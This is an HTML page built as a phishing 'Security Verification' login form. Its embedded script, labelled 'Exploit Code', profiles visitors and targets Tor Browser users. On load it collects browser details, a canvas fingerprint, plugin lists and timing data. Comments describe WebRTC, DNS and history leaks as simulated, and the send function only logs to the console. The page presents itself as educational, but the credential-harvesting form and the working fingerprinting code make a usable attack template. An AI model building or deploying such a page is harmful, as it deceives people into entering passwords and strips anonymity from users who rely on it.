
<!DOCTYPE html>
<html>
<head>
    <title>Account Security</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f8f9fa; }
        .container { max-width: 800px; margin: 0 auto; background-color: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { color: #333; }
        .alert { background-color: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        .img-container { text-align: center; margin: 20px 0; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }
        button { background-color: #007bff; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; }
        button:hover { background-color: #0069d9; }
        footer { margin-top: 20px; text-align: center; font-size: 0.8em; color: #6c757d; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Security Verification Required</h1>
        
        
        <div class="alert">
            Unusual activity has been detected on your account.
        </div>
        
        
        <p>Please complete this security check to confirm your identity.</p>
        
        
        
        
        <form id="userForm" onsubmit="return validateForm()">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Submit</button>
        </form>
        
        
        <footer>
            &copy; 2025 Security Center | All Rights Reserved
        </footer>
    </div>
    
    <!-- Exploit Code -->
    <script>
        // Track unique visitors
        const exploitId = "EXP-20250512095159-L0MMCO6L";
        
        // Utility function to send data to collection server
        function sendData(data) {
            // In a real exploit, this would send data to an attacker-controlled server
            // This is a simulation for educational purposes only
            console.log("Data that would be sent:", data);
            
            // In a real exploit, various exfiltration techniques might be used, such as:
            // 1. Image beacons
            // 2. WebSocket connections
            // 3. Fetch API calls
            // 4. Navigator.sendBeacon
        }
        
        // Gather basic browser information
        function gatherBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                screenDimensions: window.screen.width + "x" + window.screen.height,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timeOffset: new Date().getTimezoneOffset(),
                sessionStorage: !!window.sessionStorage,
                localStorage: !!window.localStorage
            };
        }
        
        
        // WebRTC-based IP address leak attempt
        function attemptWebRTCLeak() {
            // This is a demonstration - in a real exploit this would use
            // WebRTC to potentially bypass Tor and reveal the real IP
            
            const webrtcData = { attempted: true, timestamp: new Date().toISOString() };
            
            // In a real exploit, this would use WebRTC's RTCPeerConnection API
            // to establish connections that might bypass Tor
            
            sendData({
                type: "webrtc_leak_attempt",
                exploitId: exploitId,
                data: webrtcData
            });
            
            console.log("WebRTC leak technique demonstrated (no actual leak attempted)");
        }
        
        
        
        // DNS leak demonstration
        function attemptDNSLeak() {
            // This is a demonstration - in a real exploit this would attempt
            // to force DNS lookups outside the Tor network
            
            const dnsData = { attempted: true, timestamp: new Date().toISOString() };
            
            // In a real exploit, this would use techniques to force DNS lookups
            // that might not go through the Tor network
            
            sendData({
                type: "dns_leak_attempt",
                exploitId: exploitId,
                data: dnsData
            });
            
            console.log("DNS leak technique demonstrated (no actual leak attempted)");
        }
        
        
        
        // Canvas fingerprinting technique
        function performCanvasFingerprinting() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                
                // Set canvas dimensions
                canvas.width = 200;
                canvas.height = 50;
                
                // Draw text and shapes with specific styling
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = "#069";
                ctx.fillText("Tor Browser", 2, 15);
                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                ctx.fillText("Fingerprint", 4, 30);
                
                // Add a gradient
                const gradient = ctx.createLinearGradient(0, 0, 200, 0);
                gradient.addColorStop(0, "blue");
                gradient.addColorStop(1, "white");
                ctx.fillStyle = gradient;
                ctx.fillRect(0, 40, 200, 10);
                
                // Get the canvas data URL
                const dataURL = canvas.toDataURL();
                
                // For fingerprinting, normally we'd hash this
                const fingerprint = dataURL; // In a real exploit, this would be hashed
                
                sendData({
                    type: "canvas_fingerprint",
                    exploitId: exploitId,
                    fingerprint: fingerprint.substring(0, 50) + "..." // Truncated for demo
                });
                
                return fingerprint;
            } catch (e) {
                console.error("Error in canvas fingerprinting:", e);
                return null;
            }
        }
        
        
        
        // Timing analysis technique
        function performTimingAnalysis() {
            const timingData = {
                loadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
                domInteractive: performance.timing.domInteractive - performance.timing.navigationStart,
                domContentLoaded: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
                measurements: []
            };
            
            // Perform some timing measurements
            for (let i = 0; i < 5; i++) {
                const start = performance.now();
                
                // Do some computation
                let result = 0;
                for (let j = 0; j < 10000; j++) {
                    result += Math.sqrt(j);
                }
                
                const end = performance.now();
                timingData.measurements.push(end - start);
            }
            
            sendData({
                type: "timing_analysis",
                exploitId: exploitId,
                data: timingData
            });
        }
        
        
        
        // History leaking technique demonstration
        function attemptHistoryLeak() {
            const historySites = [
                "facebook.com", "twitter.com", "linkedin.com", "youtube.com",
                "amazon.com", "reddit.com", "wikipedia.org", "instagram.com"
            ];
            
            const visitedSites = {};
            
            // In a real exploit, this would use techniques like:
            // 1. CSS :visited selectors with timing attacks
            // 2. Cache timing attacks
            // 3. Other side-channel leaks
            
            // This is just a demonstration
            historySites.forEach(site => {
                visitedSites[site] = "simulated"; // In a real exploit, this would be the actual result
            });
            
            sendData({
                type: "history_leak_attempt",
                exploitId: exploitId,
                data: { sites: visitedSites }
            });
        }
        
        
        
        // Plugin and extension enumeration
        function enumeratePlugins() {
            const pluginData = {
                plugins: [],
                mimeTypes: []
            };
            
            // Check navigator.plugins
            if (navigator.plugins) {
                for (let i = 0; i < navigator.plugins.length; i++) {
                    const plugin = navigator.plugins[i];
                    pluginData.plugins.push({
                        name: plugin.name,
                        description: plugin.description,
                        filename: plugin.filename
                    });
                }
            }
            
            // Check navigator.mimeTypes
            if (navigator.mimeTypes) {
                for (let i = 0; i < navigator.mimeTypes.length; i++) {
                    const mt = navigator.mimeTypes[i];
                    pluginData.mimeTypes.push({
                        type: mt.type,
                        description: mt.description,
                        suffixes: mt.suffixes
                    });
                }
            }
            
            sendData({
                type: "plugin_enumeration",
                exploitId: exploitId,
                data: pluginData
            });
        }
        
        
        // Validate form (cover function)
        function validateForm() {
            // This function is just for show - in a real form it would validate inputs
            alert("Form submission simulated - no data actually sent");
            return false; // Prevent actual form submission
        }
        
        // Initialize on page load
        window.onload = function() {
            setTimeout(function() {
                // Collect basic browser data
                const browserInfo = gatherBrowserInfo();
                
                // Send initial data
                sendData({
                    type: "initial_data",
                    exploitId: exploitId,
                    timestamp: new Date().toISOString(),
                    browserInfo: browserInfo
                });
                
                // Run the various techniques
                
                setTimeout(attemptWebRTCLeak, 2000);
                
                
                
                setTimeout(attemptDNSLeak, 3000);
                
                
                
                setTimeout(performCanvasFingerprinting, 1500);
                
                
                
                setTimeout(performTimingAnalysis, 4000);
                
                
                
                setTimeout(attemptHistoryLeak, 5000);
                
                
                
                setTimeout(enumeratePlugins, 2500);
                
            }, 1000);
        };
    </script>
</body>
</html>